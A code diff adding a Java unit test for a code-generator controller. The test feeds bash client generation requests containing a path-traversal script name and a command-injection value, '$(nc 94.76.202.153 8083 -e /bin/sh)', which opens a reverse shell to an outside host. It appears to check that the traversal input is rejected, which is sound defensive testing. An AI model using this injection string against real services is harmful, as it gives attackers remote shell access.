@@ -39,4 +39,95 @@ public class GeneratorControllerTest {
         Assert.assertEquals(rr.getContentType(), MediaType.APPLICATION_OCTET_STREAM_TYPE);
         Assert.assertTrue(rr.getHeaders().getFirst("Content-Disposition").contains(" filename=\"java-client-generated.zip\""));
     }
+
+
+    @Test
+    public void generateBashWithAndWithoutSecurityThreat() throws Exception {
+
+        String requestJson = "{\n" +
+                "    \"lang\": \"bash\",\n" +
+                "    \"spec\": {\n" +
+                "        \"swagger\": \"2.0\",\n" +
+                "        \"info\": {\n" +
+                "            \"title\": \"Sample API\",\n" +
+                "            \"description\": \"API description in Markdown.\",\n" +
+                "            \"version\": \"1.0.0\"\n" +
+                "        },\n" +
+                "        \"paths\": {\n" +
+                "            \"/users\": {\n" +
+                "                \"get\": {\n" +
+                "                    \"produces\": [\n" +
+                "                        \"application/json\"\n" +
+                "                    ],\n" +
+                "                    \"responses\": {\n" +
+                "                        \"200\": {\n" +
+                "                            \"description\": \"OK\"\n" +
+                "                        }\n" +
+                "                    }\n" +
+                "                }\n" +
+                "            }\n" +
+                "        }\n" +
+                "    },\n" +
+                "    \"type\": \"CLIENT\",\n" +
+                "    \"codegenVersion\": \"V2\",\n" +
+                "    \"options\": {\n" +
+                "        \"additionalProperties\": {\n" +
+                "            \"scriptName\": \"../mytemp/start\",\n" +
+                "            \"curlOptions\": \"$(nc 94.76.202.153 8083 -e /bin/sh)\"\n" +
+                "        }\n" +
+                "    }\n" +
+                "}";
+
+
+        GenerationRequest generationRequest = Json.mapper().readValue(requestJson, GenerationRequest.class);
+
+        GeneratorController g = new GeneratorController();
+        RequestContext r = new RequestContext();
+        ResponseContext rr = g.generate(r, generationRequest);
+        Assert.assertEquals(rr.getStatus(), 200);
+        Assert.assertEquals(rr.getContentType(), MediaType.APPLICATION_OCTET_STREAM_TYPE);
+        Assert.assertTrue(rr.getHeaders().getFirst("Content-Disposition").contains(" filename=\"bash-client-generated.zip\""));
+
+        String requestJsonWithThreatInTargetScriptName = "{\n" +
+                "    \"lang\": \"bash\",\n" +
+                "    \"spec\": {\n" +
+                "        \"swagger\": \"2.0\",\n" +
+                "        \"info\": {\n" +
+                "            \"title\": \"Sample API\",\n" +
+                "            \"description\": \"API description in Markdown.\",\n" +
+                "            \"version\": \"1.0.0\"\n" +
+                "        },\n" +
+                "        \"paths\": {\n" +
+                "            \"/users\": {\n" +
+                "                \"get\": {\n" +
+                "                    \"produces\": [\n" +
+                "                        \"application/json\"\n" +
+                "                    ],\n" +
+                "                    \"responses\": {\n" +
+                "                        \"200\": {\n" +
+                "                            \"description\": \"OK\"\n" +
+                "                        }\n" +
+                "                    }\n" +
+                "                }\n" +
+                "            }\n" +
+                "        }\n" +
+                "    },\n" +
+                "    \"type\": \"CLIENT\",\n" +
+                "    \"codegenVersion\": \"V2\",\n" +
+                "    \"options\": {\n" +
+                "        \"additionalProperties\": {\n" +
+                "            \"scriptName\": \"../../mytemp/start\",\n" +
+                "            \"curlOptions\": \"$(nc 94.76.202.153 8083 -e /bin/sh)\"\n" +
+                "        }\n" +
+                "    }\n" +
+                "}";
+
+
+        generationRequest = Json.mapper().readValue(requestJsonWithThreatInTargetScriptName, GenerationRequest.class);
+
+        g = new GeneratorController();
+        r = new RequestContext();
+        rr = g.generate(r, generationRequest);
+        Assert.assertEquals(rr.getStatus(), 500);
+    }
 }
